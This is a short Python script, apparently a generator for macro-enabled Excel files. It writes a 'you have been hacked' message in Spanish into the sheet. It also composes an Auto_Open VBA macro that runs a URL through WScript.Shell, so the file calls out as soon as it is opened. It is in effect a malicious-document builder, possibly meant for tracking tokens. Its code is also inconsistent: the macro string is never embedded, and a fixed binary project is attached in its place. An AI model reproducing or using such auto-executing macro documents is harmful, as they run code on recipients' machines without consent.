from openpyxl import Workbook
from openpyxl.workbook import Workbook
from backend.url_creator import create_url
import xlsxwriter

def generate_excel(mail, note, name, vba_project_file):
    file_name = f"{name}.xlsm"

    # Crear un nuevo libro de trabajo con formato .xlsm (habilitado para macros)
    workbook = xlsxwriter.Workbook(file_name, {'constant_memory': True})
    workbook.filename = file_name

    # Agregar una hoja al libro de trabajo
    worksheet = workbook.add_worksheet()

    # Escribir el mensaje en la celda A1
    worksheet.write('A1', 'Has sido hackeado por chusma')
    
    url = create_url(mail, note)
    
    vba_code = f'''
    Sub Auto_Open()
        Dim WScript As Object
        Set WScript = CreateObject("WScript.Shell")
        WScript.Run "{url}"
    End Sub
    '''


    # Insertar el archivo de proyecto VBA binario
    workbook.add_vba_project('./vbaProject.bin')

    # Cerrar el libro de trabajo
    workbook.close()
